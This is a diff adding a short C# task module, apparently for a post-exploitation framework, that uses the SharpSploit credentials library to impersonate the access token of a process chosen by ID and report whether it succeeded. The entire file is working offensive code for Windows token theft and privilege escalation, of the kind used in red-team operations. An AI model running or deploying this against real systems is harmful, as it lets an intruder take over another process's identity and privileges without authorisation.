@@ -1,0 +1,22 @@
+﻿using System;
+
+using SharpSploit.Credentials;
+
+public static class Task
+{
+    public static string Execute(string ProcessID)
+    {
+        using (Tokens t = new Tokens())
+        {
+            int ProcID = Int32.Parse(ProcessID);
+            if (t.ImpersonateProcess(ProcID))
+            {
+                return "Successfully impersonated: " + ProcessID;
+            }
+            else
+            {
+                return "Failed to impersonate: " + ProcessID;
+            }
+        }
+    }
+}
